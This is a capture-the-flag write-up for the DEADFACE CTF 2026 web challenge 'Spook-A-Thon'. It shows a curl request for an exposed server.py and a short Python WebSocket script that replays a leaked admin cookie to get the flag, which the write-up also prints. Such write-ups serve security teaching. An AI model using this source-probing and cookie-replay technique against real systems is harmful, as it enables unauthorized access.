---
title: Spook-A-Thon
tags:
  - DEADFACE CTF 2026
  - Web
---

# Spook-A-Thon

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Web |
| **Points** | 80 |
| **Author** | @RP-01? |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) · Lyna |

## Challenge

> The DEADFACE crew set up a discussion board to pick movies for their Halloween marathon. Their sysadmin, Jerry, was in a hurry, and left more exposed than a movie board should. Find what Jerry leaked and ask the server nicely for its secret.
>
> Target: `170.187.156.131`.
>
> NOTE: Avoid port `8443` on this host; that is for a different challenge.
>
> Submit the flag as: `deadface{flag-text}`

## Solution

### Jerry's leak

Port `8080` serves the movie board, and Jerry served it from the same folder as the backend. The source is just sitting there:

```bash
curl -s http://170.187.156.131:8080/server.py
```

Two things in `server.py` matter:

1. A hardcoded admin session cookie that gets checked on the WebSocket handshake.
2. A WebSocket server on port `8765` that hands over the flag when an admin sends `{"cmd": "get_flag"}`.

### Asking nicely

Connect with the leaked cookie and send the command:

```python
import asyncio, json, websockets

async def main():
    uri = "ws://170.187.156.131:8765"
    headers = {"Cookie": "session=<leaked_admin_cookie_from_server_py>"}
    async with websockets.connect(uri, additional_headers=headers) as ws:
        await ws.send(json.dumps({"cmd": "get_flag"}))
        print(await ws.recv())

asyncio.run(main())
```

The server replies with the flag.

## Flag

!!! flag "Flag"
    `deadface{serve_me_up_a_flag}`

## Takeaways

If a site looks like it runs from `python3 -m http.server`, ask for `server.py`, `app.py` and friends. The secrets are often hardcoded right there.
